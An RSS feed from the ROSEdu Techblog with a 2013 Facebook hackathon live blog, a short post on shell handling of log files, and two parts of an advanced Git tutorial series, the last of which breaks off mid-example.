<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>ROSEdu Techblog</title>
        <link>http://techblog.rosedu.org</link>
        <description><![CDATA[ROSEdu Techblog]]></description>
        <atom:link href="http://techblog.rosedu.org/rss.xml" rel="self"
                   type="application/rss+xml" />
        <lastBuildDate>Sat, 19 Oct 2013 00:00:00 UT</lastBuildDate>
        <item>
    <title>Facebook Hackathon Live Blogging</title>
    <link>http://techblog.rosedu.org/facebook-hackathon-live-blogging.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/facebook-hackathon-live-blogging.html" title="Facebook Hackathon Live Blogging">Facebook Hackathon Live Blogging</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October 19, 2013</span>
      by
      <span class="author">Alex Palcuie & Marius Ungureanu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/facebook.html">facebook</a>, <a href="/tags/hackathon.html">hackathon</a>, <a href="/tags/live.html">live</a>, <a href="/tags/blogging.html">blogging</a>, <a href="/tags/coders.html">coders</a></span>
      </span>

      <div class="right">
<img style="float:right" width="300" height="300" src="http://distilleryimage10.ak.instagram.com/b88daa3e38a911e3893622000a1fcd0b_7.jpg">
</div>
<h4 id="pm">3:30PM</h4>
<p>Ladies and gentleman, fast hackers and coder perfectionists, web developers and mobile app creators, we present you the first edition of the Facebook hackathon in Romania. Organized by your favorite open-source community ROSEdu, the volunteers have been busy all morning preparing the workspace for the 15 participating teams. We have pizza, beer and a mountain of bean bags for people who <em>move fast and break things</em>.</p>
<div style="clear:both;">

</div>
<h4 id="pm-1">3:30PM</h4>
<p>People have started their IDEs (or text editors for more hardcore people) and started installing their gems (Ruby guy here sorry). After a quick intro from the organizers about the rules, the Facebook engineers presented their skills and their expectations: it’s fun to code, but it’s awesome <strong>to ship</strong>. So happy shipping hackers!</p>
<div class="center">
<img width="600" height="400" src="https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-ash3/1381306_602864479775589_1298026562_n.jpg">
</div>
<h4 id="pm-2">5:30PM</h4>
<p>A brief pause and all the keyboard presses have stopped. The Facebook representatives have given out a random prize! One Facebook T-shirt. Congratulations to Andrei Duma! People are now back to coding and making their ideas come to life: <strong>done is better than perfect</strong>.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/premii_facebook.jpg">
</div>
<h4 id="first-team">First team</h4>
<p>Only 4 hours in the event! We have interviewed some of the participants and they’re coding, designing and implementing their application basis! The first team we interviewed is <a href="https://github.com/rosedu/3_awesome_guyes_and_a_llama">3_awesome_guys_and_a_llama</a>. These students from the University “Politehnica” of Bucharest are writing an Event Planner. From what they told us, it’s an application which tries to help people organize events for them and their friends for their night out. It’s more focused on location, than being focused on time, so they can make it a planned drink-up or dance-off. They integrate it with the Facebook Places API and would like to have bars, clubs and restaurants use their app so people can make reservations. As technology stack, they have Python on top of Google App Engine. One of the devs said that he learned about it on a <a href="https://www.udacity.com/course/cs253">Udacity course</a> which I recommend it to you. They also plan to use Twitter’s Bootstrap library because they do not have enough frontend experience.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/two_guys_llama.JPG">
</div>
<h4 id="be-green-recycle">Be green, recycle</h4>
<p>You are a human, walking down and you see a big pile of garbage. It’s a scenario common here in Romania. But what if you have an app for cleaning it? That’s what <a href="https://github.com/rosedu/sudoRecycle">sudoRecycle</a> is trying to do with their Android idea. You see the junk, take a photo, tag it with the GPS location and send it to their servers. Using their backend written in PHP, they will send teams of robots that will clean the area. Because we human beings are really lazy, they plan to use the Facebook API for gamification, so you could level up in cleaning the world.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/sudo_recycle.JPG">
</div>
<h4 id="explore-the-underground">Explore the underground</h4>
<p>We’ve all endured the lack of knowledge of moving around Bucharest, if we haven’t lived here. But <a href="https://github.com/rosedu/Dark_side_of_the_moon">dark_side_of_the_moon</a> is going to remedy this with their offline mobile subway connection app. You want to get from X to Y using the shortest route. It also wants to tell you what ground-level public transportation is there and what you can visit. Furthermore they want it to tell your friends where you’ve been after you used its functionality to check-in at your destination. Under the hood, it’s using Android 4.0+ API and they want to integrate with the Facebook API to see the places your friends have visited. The coolest feature they want to code will tell you when the next tube will arrive.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/pink_floyd.jpg">
</div>
<h4 id="grails">GRails</h4>
<p>Did you know that in the year 2013, if you apply to MIT, you must send the papers by fax or postal mail? And after you send them, a person will manually go through them and tell you that the papers have arrived? Or if you get into a university you must write 6 papers with about 60% redundant information? That’s what <a href="https://github.com/rosedu/GRails">GRails</a>, the only team made entirely of girls, is trying to solve, fighting bureaucracy with Rails 4. Now with 100% less paper involved!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/grails.jpg">
</div>
<h4 id="hiking">Hiking</h4>
<p>Everybody knows that Romania has some of the best hiking routes, beautiful views and mysterious mountains. And who doesn’t want to know what trips you can make in the wild nature? Well, you can now check out a map and see what is available for adventurers! The map also shows you elevation, so you know if it’s a long road and also an abrupt road. A Django platform by <a href="https://github.com/rosedu/saltaretii">saltaretii</a> should be enough to support this paradise for nature’s explorers!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/saltaretii.jpg">
</div>
<h4 id="i-want-to-ride-my-bicycle-i-want-to-ride-my-bike">I want to ride my bicycle, I want to ride my bike</h4>
<p>2 wheels, foot power and long distance travelling made easy! These two guys are achieving the awesome tool that brings bikers a dream app come true! Using complex algorithms, they want to give bikers many possible routes from one place to another. You can choose your own type of road, either abrupt and short or longer and less steep. The point? You can choose which kind of road you want and which is fit for you! If that is not enough, these 2 guys are doing this client side with ClojureScript… yeah, it’s the new functional kid in town which tries to solve the event driven callback hell. <a href="https://github.com/rosedu/flatride">FlatRide</a> on, people!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/flatride.jpg">
</div>
<div class="right">
<img src="/images/facebook-hackathon/jackson.jpg">
</div>
<h4 id="jackson-gabbard"><a href="https://www.facebook.com/jg">Jackson Gabbard</a></h4>
<p>From an English major in Tennessee, to the 300th Facebook employee, to the 4th one to move in the new London office. He works on developer tools for the engineers and oversees some of the most important components like <em>Tasks</em> which devs open daily to get their job done. He is a self-taught hacker and he had an enlightment moment about the power of programming the first time he used the array structure.</p>
<p>He was really communicative and willing to tell us of his opinions, about the event, mentioning that he’s amazed about the main focus of students. ‘Transportation’, ‘Finding things’ and ‘Group organization’ are recurrent themes. He said some of his coworkers are Romanian and he thinks Romania is a land where lots of engineers are being created. Proud to be a full-time hackers around here!</p>
<p>We also asked him about the Bootcamp in London, which is about learning to code. And guess what? Even executives go through these preparations to get into Facebook. The engineering team has lots of fun hacking in that period of education. It teaches you how to love the company, you get to learn the ropes while communicating and interact with other mind-like people.</p>
<p>Finally he has participated in lockdowns each year. These are periods of time when teams gather in a room and stay there for several days (usually 30) and ship a big feature. Pretty hardcore, but that’s life at Facebook.</p>
<div style="clear:both;">

</div>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Sat, 19 Oct 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/facebook-hackathon-live-blogging.html</guid>
</item>
<item>
    <title>Shell tips and tricks for log files</title>
    <link>http://techblog.rosedu.org/shell-tips-and-tricks-for-file-editing.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/shell-tips-and-tricks-for-file-editing.html" title="Shell tips and tricks for log files">Shell tips and tricks for log files</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on June 20, 2013</span>
      by
      <span class="author">Alexandru Juncu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/CLI.html">CLI</a>, <a href="/tags/bash.html">bash</a>, <a href="/tags/shell.html">shell</a>, <a href="/tags/files.html">files</a>, <a href="/tags/text.html">text</a>, <a href="/tags/truncate.html">truncate</a>, <a href="/tags/tee.html">tee</a>, <a href="/tags/tail.html">tail</a>, <a href="/tags/follow.html">follow</a></span>
      </span>

      <p>Here are are some small things you might find useful when you need to deal with text files. In the Linux/Unix world, a lot of things are text files, so you need to know how to efficiently handle them. If you are a sysadmin, you need to look at <strong>log files</strong> for most of your work time and the following might come in handy.</p>
<h3 id="following-a-log-file">Following a log file</h3>
<p>Take your <code>$GENERIC_SERVICE</code> on your server that generates a lot of logs. You could open a <strong>text editor</strong> like <code>vi</code> or <code>emacs</code> to view the logs or use <code>tail</code> to see the latest lines (or a combination of tail and <code>head</code>). But you sometimes you need to view contents of the log in real time (while the service writes the lines, you read them). This is where the best use for the tail command comes in: the <code>--follow</code> flag.</p>
<pre><code>tail -f /var/log/mylog</code></pre>
<p>Tail usually creates a process that prints a few lines (the lines that exist when you run it), but with the <code>-f</code> flag, the tail process keeps running and prints new lines as the file is being appended. The process will close when the uses issues the <code>Cltr-D</code> (end of file) command.</p>
<h3 id="truncating-a-file">Truncating a file</h3>
<p>Maybe you need to clear the contents of a log file that has gotten too big. You could do a <code>rm</code> on the file and let the service write the new logs in a new file. Some services are picky and need the file to already exist, so you could use the <code>touch</code> command (that “updates” an existing file) which has the interesting side effect when applied on a non existing file: to create an empty file (a new inode with no data blocks).</p>
<p>But you just want to empty a file (same inode, just the contents cleared). You could use the <code>truncate</code> command with the size flag of 0 bytes (<code>-s 0</code>). Or make use of the redirect operator <code>&gt;</code>.</p>
<pre><code>:&gt;file</code></pre>
<p>or just</p>
<pre><code>&gt;file</code></pre>
<p>These will open the file, and redirect nothing into it. Since it is not appending anything, the contents will be erased. <code>:</code> is the no-op command so nothing will actually be done, but the shell with open and write (well … nothing) into the file because of the redirection operator <code>&gt;</code>.</p>
<h3 id="one-input-two-outputs">One input, two outputs</h3>
<p>Some programs do not have a logging system programmed into them and just print messages to standard output. Maybe you want to save that output into a file for future use. This is simple to do with a file redirection:</p>
<pre><code>./myprogram &gt; my_log_file</code></pre>
<p>But if you do this, you will lose the output to the (virtual) terminal. A very interesting command is <code>tee</code>, that takes an input and writes to standard output, but also writes into a specified file. You need to pipe the output of a process into tee like this:</p>
<pre><code>./myprogram | tee my_log_file</code></pre>
<p>Now you have both real time printing of the messages and you have them saved for future use.</p>
<p>Hope this helps!</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Thu, 20 Jun 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/shell-tips-and-tricks-for-file-editing.html</guid>
</item>
<item>
    <title>Git Is The Answer 3/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-3.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-3.html" title="Git Is The Answer 3/3">Git Is The Answer 3/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 26, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>Finally, the third article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics will focus on things that many will use only in some very special cases.</p>
<h2 id="handling-multiple-remotes">Handling Multiple Remotes</h2>
<p>There are situations when you decide to use multiple remotes for a repository. For example, I’m using multiple remotes for my snippets repository:</p>
<pre><code>razvan@einherjar:~/code$ git remote show
gh
gl
glcs
origin

razvan@einherjar:~/code$ cat .git/config
[remote &quot;origin&quot;]
    fetch = +refs/heads/*:refs/remotes/origin/*
    url = razvan@swarm.cs.pub.ro:git-repos/code.git
[remote &quot;gh&quot;]
    url = git@github.com:razvand/snippets.git
    fetch = +refs/heads/*:refs/remotes/gh/*
[remote &quot;gl&quot;]
    url = git@gitlab.com:razvand/mine.git
    fetch = +refs/heads/*:refs/remotes/gl/*
[remote &quot;glcs&quot;]
    url = git@gitlab.cs.pub.ro:razvan.deaconescu/code.git
    fetch = +refs/heads/*:refs/remotes/glcs/*</code></pre>
<p>One particular situation when multiple remotes are required is when using a fork of a GitHub repository and doing <a href="https://help.github.com/articles/using-pull-requests" title="Using Pull Requests">pull requests</a>. This is also mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>After you create a repository fork on GitHub, you clone that fork. For example, I’ve forked the <a href="https://github.com/rosedu/site">ROSEdu site repository</a> in <a href="https://github.com/razvand/site">my forked repository</a>. I’ve cloned <a href="https://github.com/razvand/site">the forked repository</a>, worked on the local clone and then pushed changes. I would then create a pull request with those changes, that that they would be integrated in <a href="https://github.com/rosedu/site">the main repository</a>.</p>
<p>A problem arises when the fork is not synced with the main repository. Ideally, there would be a GitHub option to sync the fork. Since that doesn’t exist, the fork needs to be updated manually, though the local copy, as mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>First of all, you need to add the main repository as another remote to the local repository. This is a read-only remote. As suggested by GitHub, I’ve named this new remote <code>upstream</code>:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show
origin
upstream
razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show upstream
* remote upstream
  Fetch URL: git@github.com:rosedu/site.git
[...]</code></pre>
<p>In order to sync the local repository with the <code>upstream</code> remote (<a href="https://github.com/rosedu/site">the main repository</a>) just fetch and rebase changes:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git fetch upstream
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 11 (delta 6), reused 9 (delta 4)
Unpacking objects: 100% (11/11), done.
From github.com:rosedu/site
   d21f23f..7411020  master     -&gt; upstream/master
razvan@einherjar:~/projects/rosedu/site/site.git$ git rebase upstream/master
First, rewinding head to replay your work on top of it...
Fast-forwarded master to upstream/master.</code></pre>
<p>This changes are then pushed to the <code>origin</code> remote (<a href="https://github.com/razvand/site">the forked repository</a>):</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git push origin master
Counting objects: 16, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (11/11), done.
Writing objects: 100% (11/11), 1.99 KiB, done.
Total 11 (delta 6), reused 0 (delta 0)
To git@github.com:razvand/site.git
   6f3dd4d..7411020  master -&gt; master</code></pre>
<p>New local changes are then going to be pushed to the <code>origin</code> remote. These changes are then going to be aggregated into pull requests for the <code>upstream</code> remote (the main repository), now in sync with the forked repository.</p>
<p>The above is a specific use case for syncing a fork in GitHub, making use of two remotes: one for the original reposotiry and one for the fork. The <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">excellent GitHub article</a> thoroughly describes the steps you need to undertake to sync your fork.</p>
<h2 id="bisecting-the-history">Bisecting the History</h2>
<p>A powerful feature of Git is its ability to quickly find out a commit which introduced a bad change. Suppose you have a bug in your application:</p>
<pre><code>$ ./test_math.py 
2 + 3 = 6</code></pre>
<p>Usually, it is possible that the bug was introduced several commits backwards in time and it is harder to solve by debugging. Git comes to help with <code>git bisect</code>. First, start, the process with <code>git bisect start</code> and mark a good and a bad commit (the boundaries of the bisect range).</p>
<pre><code>$ git bisect start
$ git bisect good 368297b26ac1f0dc4
$ git bisect bad
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Git has found a commit in the middle of the range. You test your code again and see if the problem is solved or not. Then pass <code>good</code> or <code>bad</code> to <code>git bisect</code></p>
<pre><code>$ ./test_math.py
2 + 3 = 5
$ git bisect good
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).</code></pre>
<p>Continue this process until there are no more commits left in range.</p>
<pre><code>$ git bisect good 
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).</code></pre>
<p>Git even shows you the commit and it’s message. Now, do a simple <code>git show</code> to see the changeset of the bad commit:</p>
<pre><code>$ git show 1c6fddb664ce6cb7bb
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

diff --git a/test_math.py b/test_math.py
index a6624f7..6e7f061 100755
--- a/test_math.py
+++ b/test_math.py
@@ -4,7 +4,7 @@ def custom_sum(*args):
     &quot;&quot;&quot;Calculate the sum of two given numbers.
        Make the sum work for multiple arguments
     &quot;&quot;&quot;
-    crt = 0
+    crt = 1
     for var in args:
         crt += var
     return crt</code></pre>
<p>In the end, you do a <code>git bisect reset</code> to return to the starting point. Do the fix, commit and continue contributing to the project.</p>
<p>Finally, you can use <code>git bisect</code> with automated tests. Start the bisection with <code>git bisect start</code> but pass the two end-points as well</p>
<pre><code>$ git bisect start HEAD 368297b26ac1f0dc4
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Then use <code>git bisect run</code> with a script which returns 0 if the code is ok or anything else if the bug is still present. Git will do the bisection for you.</p>
<pre><code>[mihai@esgaroth repo3]$ git bisect run ./test.sh
running ./test.sh
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).
running ./test.sh
Bisecting: 1 revision left to test after this (roughly 1 step)
[d8a251d8348ac236d344a00b50a987e2af726663] Modify test_math.py (2).
running ./test.sh
Bisecting: 0 revisions left to test after this (roughly 0 steps)
[2a084b613f6b69cc8eb44648b8b5665402f5d9c0] Modify test_math.py (3).
running ./test.sh
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

bisect run success</code></pre>
<p>This is indeed a good tool to have in Git’s toolbox.</p>
<h2 id="stashing-the-goodies">Stashing the Goodies</h2>
<p>It often happens that you’ve done some changes that you don’t want to commit yet but you need to sync with the remote repository (i.e. do a pull). Or you want to merge a branch without commiting your changes. In this case, the solution is using the stash.</p>
<p>The stash is a special place for Git where you temporarily stash your changes in order to keep your repository clean:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash
Saved working directory and index state WIP on master: 7411020 Remove a stupid Maruku error.
HEAD is now at 7411020 Remove a stupid Maruku error.
razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
nothing to commit (working directory clean)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash pop
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
Dropped refs/stash@{0} (940f594b5f93e616dc16285e0677fbc78aa33620)</code></pre>
<p>The moment you stash changes, they “disappear” from the working directory. You will be able to get them by using <code>git stash pop</code>.</p>
<p>When multiple users are working on a given repository it will often happen that you need to pull their updates to see what has been done. Your local copy may have changes you’ve made yourself, but still far from a commit. In that case you would stash your changes, pull remote updates to sync your repository and then pop the stash to continue your work.</p>
<h2 id="a-reference-for-everything">A Reference For Everything</h2>
<p>We are near the end of the series. You have learned several things and you might try others as well. Yet, from time to time you may find out that you have lost a commit while playing around. Or, you rebased somewhere in the past but you need a commit which you had skipped. Or, you used <code>git reset --hard</code> and threw out a needed commit.</p>
<p>Luckily for you, Git doesn’t lose anything. Everything can be recovered by using a nice feature called <em>reflog</em> (from <em>reference log</em>). Let’s see it in action first.</p>
<pre><code>$ git reflog
096bec6 HEAD@{0}: commit: Add suggestion from Stefan Bucur.
8647ca7 HEAD@{1}: rebase finished: returning to refs/heads/master
8647ca7 HEAD@{2}: checkout: moving from master to 8647ca7c213ef26fe3426e079356a8b9c0ef1a8f^0
f020807 HEAD@{3}: commit: Ready to publish «Git is the answer - part 2» article.
274c7bc HEAD@{4}: rebase finished: returning to refs/heads/master
274c7bc HEAD@{5}: checkout: moving from master to 274c7bcc89487e3b3e5f935694046caf17bf005f^0
97b6f11 HEAD@{6}: commit: Add TODO for conclusions.</code></pre>
<p>The first column lists the commit hash at the point where the reference points to. The second is the state of <code>HEAD</code> (<code>HEAD{1}</code> is where <code>HEAD</code> previously was and so on). Then, you have a short description of what the reference is about (a commit, a checkout, a merge, a reset, etc.). This helps you in remembering what each change was about.</p>
<p>To recover a commit you just cherry pick it from the reflog using its hash or even the <code>HEAD@{id}</code> reference.</p>
<h2 id="garbage-collecting-the-repository">Garbage Collecting the Repository</h2>
<p>In the end, let’s focus on trimming down the disk usage of the repository. We want to prune some references. First, we set an expire date:</p>
<pre><code>$ git reflog expire --expire=1.day refs/head/master</code></pre>
<p>The above marks all references older than 1 day as being obsolete.</p>
<p>The second step is to find all unreachable objects:</p>
<pre><code>$ git fsck --unreachable
Checking object directories: 100% (256/256), done.
Checking objects: 100% (80/80), done.
unreachable blob 0aa0869906576afbe970251418982a5ae1a21698
unreachable blob c1b86d806044ba5e344e037ec0128f7e944d0e0f
unreachable blob 1f4998496071654c1b16eb33932d9d8b4fee5971
unreachable tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
unreachable blob d9024465bff70288deaa116a646c01f1af7170b6
unreachable blob ec1a48a4de254e80e803b4a4daa4a1f87fe4acea
unreachable blob f0c2af9359d0c360fae9779f8c8b3143e7002810
unreachable blob 17135e0a43db16a2d127a4cb2a692b41257c8c26
unreachable tree 39d3a7c06c75d063cc13adde71b745f412a6f84f
unreachable tree fad372db5c9c9b842d3786733437c5e32dda426b
unreachable blob 07c469400c9ed887416d16a178a28cb911e6634e
unreachable tree 8c1deacee70bb3329ae6cd4fa2fbf546395ea712
unreachable blob ad85a1ec621c5b58fd6876c4d88982406bd48156
unreachable tree c865c8cb1344f77363c5314a91344623fe0dd661
unreachable blob cdd55939c346385b7938f392f958812b4fa5ddaf
unreachable blob d8255f99d74b09435a70ad3f2b23b0e69babc818
unreachable blob f7ddf120540a448c50baba1047230e9ad7d687ac
unreachable tree 30ce2c01c2792fdc4dfa6ab5c3e0c1cb876a405a
unreachable blob 09cf62d09bb027f7cfabcb0333c1837fda3c9c92
unreachable blob 435716d9434a852229aee58d16104c3335684113
unreachable blob 974f61a4933ee5608b1810e569593adf2ffedd0b
unreachable tree b3df14961958afa1b0434c1a31065751fef3b30d</code></pre>
<p>Finally, we prune everything and then garbage collect the repository.</p>
<pre><code>$ git prune
$ git gc
Counting objects: 652, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (637/637), done.
Writing objects: 100% (652/652), done.
Total 652 (delta 373), reused 64 (delta 10)</code></pre>
<p>We can check the reduction in size by issuing a <code>du .</code> before and after the process. For this repository, we’ve managed to squeeze 3MB of space, not quite an impressive feat. However, for rapidly changing projects the gains should be higher.</p>
<p>In the end, looking at reflog we see</p>
<pre><code>$ git reflog --all
16a82d6 refs/remotes/gh/master@{0}: update by push
d3f979f refs/remotes/gh/master@{1}: update by push
454935e refs/remotes/gh/master@{2}: pull --rebase: fast-forward
bae10c0 refs/remotes/gh/master@{3}: update by push
c0a692b refs/remotes/gh/master@{4}: pull --rebase: fast-forward
04c5a1b refs/remotes/gh/master@{5}: pull --rebase: fast-forward
745963b refs/remotes/gh/master@{6}: pull --rebase: fast-forward
fd23db9</code></pre>
<p>The last line shows the id of one commit but nothing more related to it. You can still reset/rebase to there but you cannot point to any reference past it.</p>
<h2 id="closing-up">Closing Up</h2>
<p>We are at the close of this three part article on advanced git usage. Some of the things presented here might make you ask <em>when I’ll be using that?</em>. Some of them will prove useful from time to time while others are a good thing to know.</p>
<p>In the end, remember that Git is a swiss army knife among VCSs and there are a lot of features which will make us masters of it should we learn and practice using them. Like Vim, above a certain threshold Git can only be learnt by using it on a day to day basis.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 26 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-3.html</guid>
</item>
<item>
    <title>Git Is The Answer 2/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-2.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-2.html" title="Git Is The Answer 2/3">Git Is The Answer 2/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 22, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>The second article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics is focused on cases where multiple branches are involved.</p>
<h2 id="my-changes-conflict-with-yours">My Changes Conflict With Yours</h2>
<p>Usually, it happens that two developers are working on the same file. Git tries its best to merge changesets from both developers without complaining. However, Git is not a human being so it cannot know what change is the good ones when two changes happen two close to one another in the file.</p>
<p>As opposed to SVN, in Git, it is the responsibility of the one who pulls to solve conflicts. Thus, you are forced to solve conflicts before being able to push your changes upstream. But how does it work?</p>
<p>When you try to pull a file which contains conflicting changes, git will stop with a strange message. We will use the <code>git pull --rebase</code> command instead of the <code>git pull</code>.</p>
<pre><code>Using index info to reconstruct a base tree...
M   numbers
Falling back to patching base and 3-way merge...
Auto-merging numbers
CONFLICT (content): Merge conflict in numbers
Failed to merge in the changes.
Patch failed at 0001 Add a don&#39;t like line.
The copy of the patch that failed is found in:
   /tmp/repos/repo3/.git/rebase-apply/patch

When you have resolved this problem, run &quot;git rebase --continue&quot;.
If you prefer to skip this patch, run &quot;git rebase --skip&quot; instead.
To check out the original branch and stop rebasing, run &quot;git rebase --abort&quot;.</code></pre>
<p>Even the file you changed looks awkward:</p>
<pre><code>4
&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
insert here 5
=======
I don&#39;t like this line 5
&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add a don&#39;t like line.
6</code></pre>
<p>As you can see, there are 3 more lines inserted. The ones starting with <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code> and <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> mark the boundary of the conflicting area as well as the origin of the two conflicting changes (in our case <code>HEAD</code> is our repository’s latest commit while <code>Add a don't like line.</code> is the commit message of the last commit on the remote).</p>
<p>Between the two marks, you have the two changes, separated by <code>=======</code>. You, as a developer, have to choose what makes sense: either keep only one of the changes, merge them together or even write something totally new.</p>
<p>You edit the file with the desired change and add it back for staging. After this you simply continue the rebase process.</p>
<pre><code>git add numbers
git rebase --continue</code></pre>
<p>If there are more conflicting changes you will have to reapply the same procedure. Otherwise, you can go forward to pushing your changes. As you can see, no conflict ever leaves your repository, you are forced to deal with it before continuing.</p>
<p><strong>Note</strong>: Remember to solve all conflicts in the same file before continuing the rebase process. Otherwise artifacts will be committed. (this is an edit suggested via comments by Stefan Bucur).</p>
<h2 id="tags-and-branches-for-the-win">Tags and Branches For The Win</h2>
<p>Tags are the best way to keep references to old commits. They are particularly helpful in school related activities, where you update lectures and lab tasks on an yearly basis.</p>
<p>The right way to handle this is to create a tag at the end of each year and update labs and tasks. If at any time you want to check out the old curriculum you can get back to that tag.</p>
<p>For example, for the <a href="http://elf.cs.pub.ro/saisp/" title="SAISP">SAISP</a> repository, we’ve created tag a tag at the end of each year of study:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git tag
2009-2010
2010-2011
2011-2012</code></pre>
<p>If we would like to go to an old version we would simply create a branch starting from that tag:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git checkout -b br-2010-2011 2010-2011
Switched to a new branch &#39;br-2010-2011&#39;
razvan@einherjar:~/school/current/saisp/repo$ git status
# On branch br-2010-2011
nothing to commit (working directory clean)</code></pre>
<p>This allows easy organization of your tree, with no need to create other folders (one for each year). If you want to access information for a given year, you would just create a new branch.</p>
<p>This isn’t the case for the current <a href="https://github.com/rosedu/cdl" title="CDL repository">CDL repository</a>. I’m not particularly happy with it and will probably update it soon. As we weren’t very Git aware at the time we’ve created the repository, we started using a folder for each year:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
